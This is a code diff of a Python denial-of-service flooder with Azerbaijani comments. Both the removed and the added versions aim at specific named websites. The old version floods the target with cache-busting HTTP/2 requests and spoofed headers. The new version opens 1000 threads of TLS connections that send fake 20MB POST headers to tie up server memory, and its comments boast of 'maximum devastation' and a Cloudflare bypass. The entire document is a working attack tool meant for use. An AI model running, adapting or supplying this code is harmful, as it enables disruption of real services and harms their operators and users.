@@ -1,75 +1,80 @@
-import asyncio
-import httpx
+import socket
+import ssl
+import threading
 import random
 import string
 import time
 
-# ==========================================
-# 🎯 HƏDƏFİ BURADA DƏYİŞ (TARGET CONFIG)
-# ==========================================
-TARGET_URL = "https://streamwin.win"
-WORKERS = 800         # Railway Paid üçün maksimal asinxron tutumu
-BATCH_SIZE = 120       # Bir worker-in eyni anda açdığı stream sayısı
-# ==========================================
+# --- MAXIMUM DEVASTATION CONFIG ---
+TARGET_HOST = "www.appl88-vip.com"
+TARGET_PORT = 443
+THREADS = 1000 # Railway Paid üçün maksimal şəbəkə sıxlığı
+BATCH_SIZE = 100 # Bir bağlantıda serveri boğan asinxron dalğa
 
 def r_str(n):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))
 
-async def fatal_strike(worker_id, client):
+def death_strike():
+    # SSL Handshake-i serveri CPU tərəfdən kilitləmək üçün 'Ağır' tənzimləyirik
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    # Şifrləməni serveri ən çox yoran üsulda saxlayırıq
+    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
+
     while True:
         try:
-            # Serveri bazadan vurmaq üçün ağır API parametrləri və cache-bypass
-            # Bu, sorğunu mütləq şəkildə ANA SERVERƏ (Origin) göndərməyə məcbur edir
-            url = f"{TARGET_URL}/?v={time.time()}&id={r_str(30)}&search={r_str(80)}"
-            
-            headers = {
-                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,6)}.0.0.0 Safari/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
-                "X-Requested-With": "XMLHttpRequest",
-                "Cache-Control": "no-cache, no-store, must-revalidate",
-                "Connection": "keep-alive"
-            }
+            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.settimeout(5)
 
-            # HTTP/2 MULTIPLEXING: Bir bağlantıdan minlərlə "yarımçıq" müraciət
-            # Bu serverin prosessoruna "Atom Bombası" effekti verir
-            tasks = []
+            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
+            conn.connect((TARGET_HOST, TARGET_PORT))
+
+            # BATCH STRIKE: Bir bağlantı içində serveri minlərlə yarımçıq paketlə boğmaq
             for _ in range(BATCH_SIZE):
-                # VECTOR A: Ağır POST (Server RAM-ını kilitləmək üçün)
-                if _ % 5 == 0:
-                    tasks.append(client.post(url, headers=headers, content=r_str(1500)))
-                # VECTOR B: Sürətli GET (Connection portlarını bağlamaq üçün)
-                else: 
-                    tasks.append(client.get(url, headers=headers))
-            
-            # Dalğanı serverin prosessoruna çırp!
-            responses = await asyncio.gather(*tasks, return_exceptions=True)
-            
-            # Əgər 5xx xətaları gəlməyə başlayırsa, deməli zərbə endirilir
-            for r in responses:
-                if hasattr(r, 'status_code') and r.status_code >= 500:
-                    print(f"☢️  NUCLEAR HIT! Server Status: {r.status_code}", end="\r")
+                # Serverin API yollarını hədəf alırıq (Backend yormaq üçün)
+                path = f"/?v={time.time()}&id={r_str(20)}&invite_code={random.randint(1000, 9999)}"
+                ip = f"{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+                
+                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
+                # Content-Length-i 20MB göstəririk ki, server dərhal RAM ayırıb gözləsin
+                payload = (
+                    f"POST {path} HTTP/1.1\r\n"
+                    f"Host: {TARGET_HOST}\r\n"
+                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15\r\n"
+                    f"X-Forwarded-For: {ip}\r\n"
+                    f"Content-Type: application/x-www-form-urlencoded\r\n"
+                    f"Content-Length: 20971520\r\n" # 20 Megabyte "Yalançı" yük
+                    f"Connection: keep-alive\r\n"
+                    f"\r\n"
+                ).encode()
 
-        except Exception:
-            await asyncio.sleep(0.01)
+                conn.sendall(payload)
+                # İkinci zərbə: Serveri asılı (Hanging) saxlamaq üçün yarımçıq paketlər
+                conn.send(b"\x00")
+            
+            # Bağlantını bağlama, timeout olana qədər serverin resursunu tut
+            time.sleep(2)
+            conn.close()
+        except:
+            pass
 
-async def main():
-    print(f"💀 NEUTRON STAR ACTIVATED ON: {TARGET_URL}")
-    print(f"[*] Power: {WORKERS} Workers | Speed: {WORKERS * BATCH_SIZE} RPS Capability")
+def main():
+    print(f"☢️  DOOMSDAY PROTOCOL ACTIVATED: {TARGET_HOST}")
+    print("[!] Target is being saturated with persistent zombie-connections...")
     
-    # TCP hüdudlarını və bağlantı limitlərini tamamilə ləğv edirik
-    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
-    
-    async with httpx.AsyncClient(
-        http2=True,          # Cloudflare Bypass üçün MÜTLƏQDİR
-        verify=False, 
-        limits=limits, 
-        timeout=10.0         # Server donanda bağlantını buraxma (Slowloris)
-    ) as client:
-        
-        workers = [fatal_strike(i, client) for i in range(WORKERS)]
-        await asyncio.gather(*workers)
+    for i in range(THREADS):
+        t = threading.Thread(target=death_strike)
+        t.daemon = True
+        t.start()
+        if i % 100 == 0:
+            print(f"[*] {i} Heavy Warheads Launched...")
+            time.sleep(0.1)
+
+    while True:
+        time.sleep(1)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
